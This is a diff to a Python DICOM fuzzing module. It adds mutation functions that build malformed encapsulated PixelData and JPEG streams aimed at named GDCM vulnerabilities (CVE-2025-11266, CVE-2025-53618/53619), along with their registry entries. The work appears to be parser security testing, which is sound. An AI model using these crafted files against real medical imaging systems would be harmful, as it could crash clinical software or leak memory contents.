@@ -5,13 +5,16 @@ These target specific vulnerability patterns found in real-world DICOM parsers.
 
 CVEs Covered:
 - CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
+- CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData fragments
+- CVE-2025-53618: GDCM JPEG codec out-of-bounds read (info leak)
+- CVE-2025-53619: GDCM JPEG codec out-of-bounds read
 - CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
 - CVE-2020-29625: DCMTK denial of service via malformed length fields
 - CVE-2021-41946: ClearCanvas path traversal via filename injection
 - CVE-2022-24193: OsiriX denial of service via deep nesting
 
 References:
-- CISA ICS-CERT Medical Advisories
+- CISA ICS-CERT Medical Advisories (ICSMA-25-160-01, ICSMA-25-345-01)
 - NIST NVD DICOM entries
 - OWASP Medical Device Security
 
@@ -32,11 +35,15 @@ class CVECategory(Enum):
     HEAP_OVERFLOW = "heap_overflow"
     BUFFER_OVERFLOW = "buffer_overflow"
     INTEGER_OVERFLOW = "integer_overflow"
+    INTEGER_UNDERFLOW = "integer_underflow"
     PATH_TRAVERSAL = "path_traversal"
     DENIAL_OF_SERVICE = "denial_of_service"
     POLYGLOT = "polyglot"
     DEEP_NESTING = "deep_nesting"
     MALFORMED_LENGTH = "malformed_length"
+    ENCAPSULATED_PIXEL = "encapsulated_pixel"
+    JPEG_CODEC = "jpeg_codec"
+    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
 
 
 @dataclass
@@ -353,6 +360,214 @@ def mutate_invalid_transfer_syntax(data: bytes) -> bytes:
     return bytes(result)
 
 
+# CVE-2025-11266: GDCM Encapsulated PixelData Fragment Underflow
+
+
+def mutate_encapsulated_pixeldata_underflow(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-11266 integer underflow.
+
+    GDCM vulnerability in encapsulated PixelData fragment parsing:
+    - Unsigned integer underflow in buffer indexing
+    - Triggered by malformed fragment structures
+    - Causes out-of-bounds write leading to segfault
+
+    Attack vector: Malformed encapsulated PixelData with invalid fragment sizes.
+    """
+    result = bytearray(data)
+
+    # Encapsulated PixelData markers
+    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010) PixelData
+    item_tag = b"\xfe\xff\x00\xe0"  # Item delimiter
+    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence delimitation
+
+    # Find PixelData tag
+    idx = data.find(pixel_data_tag)
+    if idx == -1:
+        # No PixelData found, create malicious encapsulated structure
+        # This simulates encapsulated JPEG data with malformed fragments
+        malicious_encap = (
+            pixel_data_tag
+            + b"OB"  # VR
+            + b"\x00\x00"  # Reserved
+            + b"\xff\xff\xff\xff"  # Undefined length
+            # Fragment 0 (offset table) - malformed
+            + item_tag
+            + b"\x00\x00\x00\x00"  # Empty offset table
+            # Fragment 1 - underflow trigger: size that causes underflow
+            + item_tag
+            + struct.pack("<I", 0xFFFFFFFF)  # Max uint32 size (underflow trigger)
+            + b"\xff" * 16  # Minimal data
+            # Fragment 2 - zero size (edge case)
+            + item_tag
+            + b"\x00\x00\x00\x00"
+            # Sequence end
+            + seq_delim
+            + b"\x00\x00\x00\x00"
+        )
+        result = result[:-4] + malicious_encap + result[-4:]
+    else:
+        # Modify existing PixelData to trigger underflow
+        # Find and corrupt fragment lengths
+        search_start = idx + 8
+        fragment_idx = result.find(item_tag, search_start)
+        if fragment_idx != -1:
+            # Set fragment length to trigger underflow (0xFFFFFFFF)
+            length_pos = fragment_idx + 4
+            if length_pos + 4 < len(result):
+                result[length_pos : length_pos + 4] = b"\xff\xff\xff\xff"
+
+    return bytes(result)
+
+
+def mutate_fragment_count_mismatch(data: bytes) -> bytes:
+    """Create mutation with mismatched fragment counts.
+
+    Targets parsers that pre-allocate based on offset table but receive
+    different number of actual fragments.
+    """
+    result = bytearray(data)
+
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    item_tag = b"\xfe\xff\x00\xe0"
+    seq_delim = b"\xfe\xff\xdd\xe0"
+
+    # Create structure with offset table claiming more fragments than exist
+    malicious = (
+        pixel_data_tag
+        + b"OB\x00\x00"
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Offset table claiming 10 fragments
+        + item_tag
+        + struct.pack("<I", 40)  # 10 offsets * 4 bytes
+        + struct.pack("<I", 0) * 10  # 10 offset entries
+        # But only provide 1 actual fragment
+        + item_tag
+        + struct.pack("<I", 8)
+        + b"\x00" * 8
+        # End sequence early
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
+
+    # Append to end
+    result = result[:-4] + malicious + result[-4:]
+    return bytes(result)
+
+
+# CVE-2025-53618/53619: GDCM JPEG Codec Out-of-Bounds Read
+
+
+def mutate_jpeg_codec_oob_read(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-53618/53619 JPEG codec OOB read.
+
+    GDCM JPEGBITSCodec::InternalCode vulnerability:
+    - Out-of-bounds read during JPEG decompression
+    - Can leak memory contents (information disclosure)
+    - Triggered by malformed JPEG stream in encapsulated PixelData
+
+    Attack vector: Crafted JPEG with invalid Huffman tables or segment sizes.
+    """
+    result = bytearray(data)
+
+    # JPEG markers
+    soi = b"\xff\xd8"  # Start of Image
+    eoi = b"\xff\xd9"  # End of Image
+    sof0 = b"\xff\xc0"  # Start of Frame (baseline DCT)
+    dht = b"\xff\xc4"  # Define Huffman Table
+    sos = b"\xff\xda"  # Start of Scan
+
+    # Create malformed JPEG that triggers OOB read in Huffman decoding
+    malformed_jpeg = (
+        soi
+        # SOF0 with invalid dimensions that cause buffer miscalculation
+        + sof0
+        + struct.pack(">H", 11)  # Length
+        + b"\x08"  # Precision
+        + struct.pack(">H", 0xFFFF)  # Height (max)
+        + struct.pack(">H", 0xFFFF)  # Width (max)
+        + b"\x01"  # Components
+        + b"\x01\x11\x00"  # Component spec
+        # DHT with truncated/invalid Huffman table
+        + dht
+        + struct.pack(">H", 5)  # Length too short for valid table
+        + b"\x00"  # Table class/ID
+        + b"\xff\xff"  # Invalid counts (will cause OOB read)
+        # SOS with invalid scan header
+        + sos
+        + struct.pack(">H", 8)  # Length
+        + b"\x01"  # Components
+        + b"\x01\x00"  # Component selector
+        + b"\x00\x3f\x00"  # Spectral selection
+        # Minimal scan data (truncated)
+        + b"\x00" * 4
+        + eoi
+    )
+
+    # Wrap in DICOM encapsulated format
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    item_tag = b"\xfe\xff\x00\xe0"
+    seq_delim = b"\xfe\xff\xdd\xe0"
+
+    encapsulated = (
+        pixel_data_tag
+        + b"OB\x00\x00"
+        + b"\xff\xff\xff\xff"
+        # Empty offset table
+        + item_tag
+        + b"\x00\x00\x00\x00"
+        # JPEG fragment
+        + item_tag
+        + struct.pack("<I", len(malformed_jpeg))
+        + malformed_jpeg
+        # End
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
+
+    # Append to data
+    result = result[:-4] + encapsulated + result[-4:]
+    return bytes(result)
+
+
+def mutate_jpeg_truncated_stream(data: bytes) -> bytes:
+    """Create mutation with truncated JPEG stream.
+
+    Parser may read beyond buffer when stream ends unexpectedly.
+    """
+    result = bytearray(data)
+
+    # Minimal JPEG that's truncated mid-scan
+    truncated_jpeg = (
+        b"\xff\xd8"  # SOI
+        b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
+        b"\xff\xdb\x00\x43\x00"  # DQT header
+        + b"\x10" * 64  # Quantization table
+        + b"\xff\xc0\x00\x0b\x08\x00\x10\x00\x10\x01\x01\x11\x00"  # SOF0
+        + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"  # SOS header
+        # Truncate here - no scan data or EOI
+    )
+
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    item_tag = b"\xfe\xff\x00\xe0"
+    seq_delim = b"\xfe\xff\xdd\xe0"
+
+    encapsulated = (
+        pixel_data_tag
+        + b"OB\x00\x00"
+        + b"\xff\xff\xff\xff"
+        + item_tag
+        + b"\x00\x00\x00\x00"
+        + item_tag
+        + struct.pack("<I", len(truncated_jpeg))
+        + truncated_jpeg
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
+
+    result = result[:-4] + encapsulated + result[-4:]
+    return bytes(result)
+
+
 # Registry of all CVE mutations
 
 CVE_MUTATIONS: list[CVEMutation] = [
@@ -427,6 +642,40 @@ CVE_MUTATIONS: list[CVEMutation] = [
         mutation_func="mutate_invalid_transfer_syntax",
         severity="medium",
         target_component="transfer_syntax",
+    ),
+    # CVE-2025-11266: GDCM encapsulated PixelData vulnerabilities
+    CVEMutation(
+        cve_id="CVE-2025-11266",
+        category=CVECategory.INTEGER_UNDERFLOW,
+        description="GDCM integer underflow in encapsulated PixelData fragments",
+        mutation_func="mutate_encapsulated_pixeldata_underflow",
+        severity="high",
+        target_component="encapsulated_pixel_data",
+    ),
+    CVEMutation(
+        cve_id="CVE-2025-11266",
+        category=CVECategory.ENCAPSULATED_PIXEL,
+        description="Fragment count mismatch in offset table",
+        mutation_func="mutate_fragment_count_mismatch",
+        severity="high",
+        target_component="encapsulated_pixel_data",
+    ),
+    # CVE-2025-53618/53619: GDCM JPEG codec vulnerabilities
+    CVEMutation(
+        cve_id="CVE-2025-53618",
+        category=CVECategory.OUT_OF_BOUNDS_READ,
+        description="GDCM JPEG codec OOB read via malformed Huffman tables",
+        mutation_func="mutate_jpeg_codec_oob_read",
+        severity="high",
+        target_component="jpeg_codec",
+    ),
+    CVEMutation(
+        cve_id="CVE-2025-53619",
+        category=CVECategory.JPEG_CODEC,
+        description="Truncated JPEG stream causing OOB read",
+        mutation_func="mutate_jpeg_truncated_stream",
+        severity="high",
+        target_component="jpeg_codec",
     ),
 ]
 
